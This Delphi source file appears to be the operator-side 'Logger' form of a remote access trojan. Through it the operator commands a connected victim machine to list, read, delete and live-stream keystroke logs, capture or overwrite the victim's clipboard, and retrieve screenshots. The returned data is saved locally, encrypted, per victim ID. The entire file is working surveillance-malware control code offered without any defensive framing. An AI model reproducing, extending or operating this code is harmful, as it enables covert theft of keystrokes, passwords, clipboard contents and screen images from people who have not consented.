unit UnitLogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, jpeg, ExtCtrls, acImage, UnitMain, StdCtrls,
  Menus, SocketUnitEx, UnitCommands, UnitFunctions, UnitVariables, UnitRepository,
  UnitConstants, UnitEncryption, UnitManager, GR32_Image, GR32_RangeBars;

type
  TFormLogger = class(TForm)
    tlb1: TToolBar;
    btn2: TToolButton;
    btn3: TToolButton;
    pnlClipboard: TPanel;
    pnlOffline: TPanel;
    mmoClipboard: TMemo;
    tv1: TTreeView;
    spl1: TSplitter;
    mmoKeylogger: TMemo;
    btn6: TToolButton;
    pb1: TProgressBar;
    pm2: TPopupMenu;
    R1: TMenuItem;
    D2: TMenuItem;
    pm3: TPopupMenu;
    R2: TMenuItem;
    C1: TMenuItem;
    S1: TMenuItem;
    N1: TMenuItem;
    pm1: TPopupMenu;
    S2: TMenuItem;
    lvClipboard: TListView;
    spl2: TSplitter;
    pm4: TPopupMenu;
    S3: TMenuItem;
    btn1: TToolButton;
    pnlScr: TPanel;
    spl3: TSplitter;
    pm5: TPopupMenu;
    tv2: TTreeView;
    R3: TMenuItem;
    D1: TMenuItem;
    S4: TMenuItem;
    dlgFind1: TFindDialog;
    R4: TMenuItem;
    N2: TMenuItem;
    img1: TImgView32;
    pnl1: TPanel;
    gbr1: TGaugeBar;
    procedure btn2Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure tv1DblClick(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure lvClipboardClick(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure tv2DblClick(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure S4Click(Sender: TObject);
    procedure dlgFind1Find(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure gbr1Change(Sender: TObject);
  private
    { Private declarations }
    Client: TClientDatas;        
    FSelPos: Integer;
    FDragging: Boolean;
    FFrom: TPoint;
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormLogger: TFormLogger;

implementation

{$R *.dfm}

type
  TClipboardDatas = class
    Datas: string;
  end;
                           
constructor TFormLogger.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormLogger.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormLogger.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormLogger.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormLogger.btn2Click(Sender: TObject);
begin
  pnlOffline.BringToFront;
  if tv1.Items.Count = 0 then R1Click(Sender);
end;

procedure TFormLogger.btn3Click(Sender: TObject);
begin
  pnlClipboard.BringToFront;
  if lvClipboard.Items.Count = 0 then R2Click(Sender);
end;

procedure TFormLogger.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpStr, TmpStr1, TmpStr2: string;
  TmpItem: TListItem;
  i: Integer;
  TmpNode: TTreeNode;
  Stream: TMemoryStream;
  FindData: TWin32FindData;
  ClipboardDatas: TClipboardDatas;
  Bmp: TBitmap;
  jpg: TJPEGImage;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = KEYLOGGERLISTREPO then
    begin
      mmoKeylogger.Clear;
      tv1.Items.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Keylogs not found', clRed);
        Exit;
      end;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      pb1.Max := Stream.Size;
      pb1.Position := 0;

      tv1.Items.BeginUpdate;
      while Stream.Position < Stream.Size do
      begin
        Application.ProcessMessages;
        pb1.Position := Stream.Size;

        Stream.Read(FindData, SizeOf(TWin32FindData));
        if string(FindData.cFileName) = '.' then Continue;
        if FindData.cFileName = '..' then Continue;

        if FindData.dwFileAttributes and $00000010 <> 0 then
        begin
          TmpNode := tv1.Items.Add(nil, FindData.cFileName);
          TmpNode.ImageIndex := 3;
          TmpNode.SelectedIndex := 3;
        end;
      end;

      tv1.Items.EndUpdate;
      AddRecvLog(IntToStr(tv1.Items.Count) + ' keylogs folders found');
    end
    else

    if MainCommand = KEYLOGGERLISTLOGS then
    begin
      tv1.Selected.DeleteChildren;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;
                               
      pb1.Max := Stream.Size;
      pb1.Position := 0;

      tv1.Items.BeginUpdate;
      while Stream.Position < Stream.Size do
      begin
        Application.ProcessMessages;  
        pb1.Position := Stream.Size;

        Stream.Read(FindData, SizeOf(TWin32FindData));
        if string(FindData.cFileName) = '.' then Continue;
        if FindData.cFileName = '..' then Continue;
        if FindData.dwFileAttributes and $00000010 <> 0 then Continue;

        TmpNode := tv1.Items.AddChild(tv1.Selected, FindData.cFileName);
        TmpNode.ImageIndex := GetImageIndex('*' + ExtractFileExt(FindData.cFileName));
        TmpNode.SelectedIndex := TmpNode.ImageIndex;
      end;

      tv1.Items.EndUpdate;
      tv1.Selected.Expanded := True;
      AddRecvLog(IntToStr(tv1.Selected.Count) + ' keylogs file found');
    end
    else

    if MainCommand = KEYLOGGERREADLOG then
    begin
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      for i := 0 to tv1.Items.Count - 1 do
      if tv1.Items.Item[i].Text = Copy(TmpStr1, 1, Pos('\', TmpStr1) - 1) then
      begin
        TmpStr2 := tv1.Items.Item[i].Text;
        Break;
      end;

      AddRecvLog('Keylog' + '''' + 's ' + TmpStr1 + ' datas');

      TmpStr := GetKeyloggerFolder(Client.UserId);
      TmpStr := TmpStr + '\' + TmpStr2;
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := GetKeyloggerFolder(Client.UserId) + '\' + TmpStr1 + '.data';

      mmoKeylogger.Text := Datas;                               
      mmoKeylogger.SelStart := Length(mmoKeylogger.Text); 
      SendMessage(mmoKeylogger.handle, EM_SCROLLCARET, 0, 0);

      Datas := EnDecryptText(Datas, PROGRAMPASSWORD);
      MyCreateFile(TmpStr, Datas, Length(Datas));
    end
    else

    if MainCommand = KEYLOGGERLIVESTART then
    begin
      mmoKeylogger.Text := Datas;
      mmoKeylogger.SelStart := Length(mmoKeylogger.Text);
      SendMessage(mmoKeylogger.Handle, EM_SCROLLCARET, 0, 0);
    end
    else

    if MainCommand = KEYLOGGERDELLOG then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
      Delete(TmpStr, 1, Pos('\', TmpStr));

      if Datas = 'N' then
        AddRecvLog('Failed to delete Keylog ' + TmpStr1, clRed)
      else
      begin
        tv1.Items.BeginUpdate;
        for i := 0 to tv1.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if tv1.Items.Item[i].Text = TmpStr1 then
          begin
            tv1.Selected.Delete;
            Break;
          end;
        end;

        tv1.Items.EndUpdate;
        AddRecvLog('Keylog ' + TmpStr1 + ' deleted successfully');
      end;
    end
    else

    if MainCommand = KEYLOGGERDELREPO then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to delete keylogs folder ' + TmpStr, clRed)
      else
      begin
        tv1.Items.BeginUpdate;
        for i := 0 to tv1.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if tv1.Items.Item[i].Text = TmpStr then
          begin
            tv1.Items.Item[i].Delete;
            Break;
          end;
        end;

        tv1.Items.EndUpdate;  
        AddRecvLog('Keylogs folder ' + TmpStr + ' delete successfully');
      end;
    end
    else

    if MainCommand = CLIPBOARDTEXT then
    begin
      TmpItem := lvClipboard.Items.Add;
      TmpItem.Caption := 'Text';
      TmpItem.SubItems.Add(TimeToStr(Time));
      TmpItem.SubItems.Add(FileSizeToStr(Length(Datas)));

      ClipboardDatas := TClipboardDatas.Create;
      ClipboardDatas.Datas := Datas;
      TmpItem.Data := ClipboardDatas;

      AddRecvLog('Clipboard datas with size ' + TmpItem.SubItems[1]);
    end
    else

    if MainCommand = CLIPBOARDFILES then
    begin
      TmpItem := lvClipboard.Items.Add;
      TmpItem.Caption := 'Files';
      TmpItem.SubItems.Add(TimeToStr(Time));
      TmpItem.SubItems.Add(FileSizeToStr(Length(Datas)));
      
      ClipboardDatas := TClipboardDatas.Create;
      ClipboardDatas.Datas := Datas;
      TmpItem.Data := ClipboardDatas;

      AddRecvLog('Clipboard datas with size ' + TmpItem.SubItems[1]);
    end
    else
    
    if MainCommand = SCREENLOGGERLISTREPO then
    begin
      img1.Bitmap := nil;
      tv2.Items.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Screenlogs not found', clRed);
        Exit;
      end;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      pb1.Max := Stream.Size;
      pb1.Position := 0;

      tv1.Items.BeginUpdate;
      while Stream.Position < Stream.Size do
      begin
        Application.ProcessMessages;
        pb1.Position := Stream.Size;

        Stream.Read(FindData, SizeOf(TWin32FindData));
        if string(FindData.cFileName) = '.' then Continue;
        if FindData.cFileName = '..' then Continue;

        if FindData.dwFileAttributes and $00000010 <> 0 then
        begin
          TmpNode := tv2.Items.Add(nil, FindData.cFileName);
          TmpNode.ImageIndex := 3;
          TmpNode.SelectedIndex := 3;
        end;
      end;

      tv2.Items.EndUpdate;
      AddRecvLog(IntToStr(tv2.Items.Count) + ' screenlogs folders found');
    end
    else

    if MainCommand = SCREENLOGGERLISTLOGS then
    begin
      tv2.Selected.DeleteChildren;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;
                               
      pb1.Max := Stream.Size;
      pb1.Position := 0;

      tv2.Items.BeginUpdate;
      while Stream.Position < Stream.Size do
      begin
        Application.ProcessMessages;  
        pb1.Position := Stream.Size;

        Stream.Read(FindData, SizeOf(TWin32FindData));
        if string(FindData.cFileName) = '.' then Continue;
        if FindData.cFileName = '..' then Continue;
        if FindData.dwFileAttributes and $00000010 <> 0 then Continue;

        TmpNode := tv2.Items.AddChild(tv2.Selected, FindData.cFileName);
        TmpNode.ImageIndex := GetImageIndex('*' + ExtractFileExt(FindData.cFileName));
        TmpNode.SelectedIndex := TmpNode.ImageIndex;
      end;

      tv2.Items.EndUpdate;
      tv2.Selected.Expanded := True;
      AddRecvLog(IntToStr(tv2.Selected.Count) + ' screenlogs file found');
    end
    else

    if MainCommand = SCREENLOGGERREADLOG then
    begin
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      for i := 0 to tv2.Items.Count - 1 do
      if tv2.Items.Item[i].Text = Copy(TmpStr1, 1, Pos('\', TmpStr1) - 1) then
      begin
        TmpStr2 := tv2.Items.Item[i].Text;
        Break;
      end;

      AddRecvLog('Screenlog' + '''' + 's ' + TmpStr1 + ' picture');

      TmpStr := GetScreenloggerFolder(Client.UserId);
      TmpStr := TmpStr + '\' + TmpStr2;
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := GetScreenloggerFolder(Client.UserId) + '\' + TmpStr1 + '.bmp';

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;                                
                                  
      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Assign(Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      img1.Bitmap.Assign(Bmp);
      Bmp.SaveToFile(TmpStr);
      Bmp.Free;
    end
    else

    if MainCommand = SCREENLOGGERDELLOG then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
      Delete(TmpStr, 1, Pos('\', TmpStr));

      if Datas = 'N' then
        AddRecvLog('Failed to delete screenlog ' + TmpStr1, clRed)
      else
      begin
        tv2.Items.BeginUpdate;
        for i := 0 to tv2.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if tv2.Items.Item[i].Text = TmpStr1 then
          begin
            tv2.Selected.Delete;
            Break;
          end;
        end;

        tv2.Items.EndUpdate;
        AddRecvLog('Screelog ' + TmpStr1 + ' deleted successfully');
      end;
    end
    else

    if MainCommand = SCREENLOGGERDELREPO then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to delete screenlogs folder ' + TmpStr, clRed)
      else
      begin
        tv2.Items.BeginUpdate;
        for i := 0 to tv2.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if tv2.Items.Item[i].Text = TmpStr then
          begin
            tv2.Items.Item[i].Delete;
            Break;
          end;
        end;

        tv2.Items.EndUpdate;
        AddRecvLog('Screenlogs folder ' + TmpStr + ' deleted successfully');
      end;
    end;
  end;
end;

procedure TFormLogger.FormShow(Sender: TObject);
begin
  btn2Click(Sender);
end;

procedure TFormLogger.FormCreate(Sender: TObject);
begin
  tv1.Images := FormMain.ImagesList;
  tv2.Images := FormMain.ImagesList;
end;

procedure TFormLogger.R1Click(Sender: TObject);
begin
  Client.SendDatas(KEYLOGGERLISTREPO + '|');
  AddSentLog('Get keylogs folders');
end;

procedure TFormLogger.tv1DblClick(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(tv1.Selected) then Exit;
  if tv1.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(KEYLOGGERLISTLOGS + '|' + tv1.Selected.Text); 
    AddSentLog('Get keylogs files');
  end
  else
  begin
    TmpStr := GetNodeRoot(tv1.Selected);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
    Client.SendDatas(KEYLOGGERREADLOG + '|' + TmpStr);      
    AddSentLog('Get keylog' + '''' + 's ' + TmpStr + ' datas');
  end;
end;

procedure TFormLogger.R2Click(Sender: TObject);
begin
  Client.SendDatas(CLIPBOARDTEXT + '|');
  AddSentLog('Get clipboard datas');
end;

procedure TFormLogger.S1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := InputBox('Set clipboard text', 'Clipboard text', '');
  Client.SendDatas(CLIPBOARDSETTEXT + '|' + TmpStr);
  AddSentLog('Set clipboard data to ' + TmpStr);
end;

procedure TFormLogger.C1Click(Sender: TObject);
begin
  Client.SendDatas(CLIPBOARDCLEAR + '|');
  AddSentLog('Clear clipboard datas');
  mmoClipboard.Clear;
end;

procedure TFormLogger.D2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(tv1.Selected) then Exit;
  if tv1.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(KEYLOGGERDELREPO + '|' + tv1.Selected.Text);
    AddSentLog('Delete keylogs folder ' + tv1.Selected.Text);
  end
  else
  begin
    TmpStr := GetNodeRoot(tv1.Selected);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
    Client.SendDatas(KEYLOGGERDELLOG + '|' + TmpStr);
    AddSentLog('Delete keylog ' + TmpStr);
  end;
end;

procedure TFormLogger.S2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if mmoKeylogger.Text = '' then
  begin
    MessageBox(Handle, 'Offline keylogger is disabled.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  S2.Checked := not S2.Checked;
  if not S2.Checked then
  begin
    Client.SendDatas(KEYLOGGERLIVESTOP + '|');   
    AddSentLog('Stop live keylogger');
    tv1.Visible := True;
  end
  else
  begin
    TmpStr := GetNodeRoot(tv1.Selected);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
    Client.SendDatas(KEYLOGGERLIVESTART + '|' + TmpStr);
    AddSentLog('Start live keylogger');
    tv1.Visible := False;
  end;
end;

procedure TFormLogger.lvClipboardClick(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lvClipboard.Selected) then Exit;
  TmpStr := TClipboardDatas(lvClipboard.Selected.Data).Datas;

  if lvClipboard.Selected.Caption = 'Text' then
    mmoClipboard.Text := TmpStr
  else
  begin
    mmoClipboard.Clear;
    mmoClipboard.Lines.BeginUpdate;
    while TmpStr <> '' do
    begin
      Application.ProcessMessages;
      mmoClipboard.Lines.Add(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
      Delete(TmpStr, 1, Pos('|', TmpStr));
    end;
    mmoClipboard.Lines.EndUpdate;
  end;

  AddLog('Clipboard datas of ' + lvClipboard.Selected.SubItems[0] + ' showed');
end;

procedure TFormLogger.S3Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := GetClipboardFolder(Client.UserId) + '\' + MyGetTime('_') + '.data';
  TmpStr1 := EnDecryptText(mmoClipboard.Text, PROGRAMPASSWORD);
  MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
  AddLog('Clipboard datas saved');
end;

procedure TFormLogger.btn1Click(Sender: TObject);
begin
  pnlScr.BringToFront;
  if tv2.Items.Count = 0 then R3Click(Sender);
end;

procedure TFormLogger.tv2DblClick(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(tv2.Selected) then Exit;
  if tv2.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(SCREENLOGGERLISTLOGS + '|' + tv2.Selected.Text);
    AddSentLog('Get screenlogs files');
  end
  else
  begin
    TmpStr := GetNodeRoot(tv2.Selected);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
    Client.SendDatas(SCREENLOGGERREADLOG + '|' + TmpStr);
    AddSentLog('Get screenlog' + '''' + 's ' + TmpStr + ' picture');
  end;
end;

procedure TFormLogger.R3Click(Sender: TObject);
begin
  Client.SendDatas(SCREENLOGGERLISTREPO + '|');
  AddSentLog('Get screenlogs folders');
end;

procedure TFormLogger.D1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(tv2.Selected) then Exit;
  if tv2.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(SCREENLOGGERDELREPO + '|' + tv2.Selected.Text);
    AddSentLog('Delete screenlogs folder ' + tv2.Selected.Text);
  end
  else
  begin
    TmpStr := GetNodeRoot(tv2.Selected);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr) - 1);
    Client.SendDatas(SCREENLOGGERDELLOG + '|' + TmpStr);
    AddSentLog('Delete screenlog ' + TmpStr);
  end;
end;

procedure TFormLogger.S4Click(Sender: TObject);
begin
  if mmoKeylogger.Text = '' then Exit;
  FSelPos := 0;
  dlgFind1.Execute;
end;

procedure TFormLogger.dlgFind1Find(Sender: TObject);
var
  S : string;
  startpos : integer;
begin
  with TFindDialog(Sender) do
  begin
    {If the stored position is 0 this cannot be a find next. }
    if FSelPos = 0 then Options := Options - [frFindNext];

     { Figure out where to start the search and get the corresponding text from the memo. }
    if frfindNext in Options then
    begin
      { This is a find next, start after the end of the last found word. }
      StartPos := FSelPos + Length(Findtext);
      S := Copy(mmoKeylogger.Lines.Text, StartPos, MaxInt);
    end
    else
    begin
      { This is a find first, start at the, well, start. }
      S := mmoKeylogger.Lines.Text;
      StartPos := 1;
    end;

    { Perform a global case-sensitive search for FindText in S }
    FSelPos := Pos(FindText, S);
    if FSelPos > 0 then
    begin
       { Found something, correct position for the location of the start of search. }
      FSelPos := FSelPos + StartPos - 1;
      mmoKeylogger.SelStart := FSelPos - 1;
      mmoKeylogger.SelLength := Length(FindText);
      mmoKeylogger.SetFocus;
    end
    else
    begin
      { No joy, show a message. }
      if frfindNext in Options then S := Concat('Could not find "', FindText,'".') else
        S := Concat('Could not find "', FindText, '" in logs.');

      MessageBox(Handle, PChar(S), PROGRAMINFOS, MB_ICONERROR);
    end;
  end;
end;

procedure TFormLogger.R4Click(Sender: TObject);
begin
  tv1DblClick(Sender);
end;

procedure TFormLogger.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if S2.Checked then
  begin
    S2.Checked := False;
    S2Click(Sender);
  end;
end;

procedure TFormLogger.gbr1Change(Sender: TObject);
begin
  gbr1.Update;
  img1.Scale := gbr1.Position / 100;
end;

end.
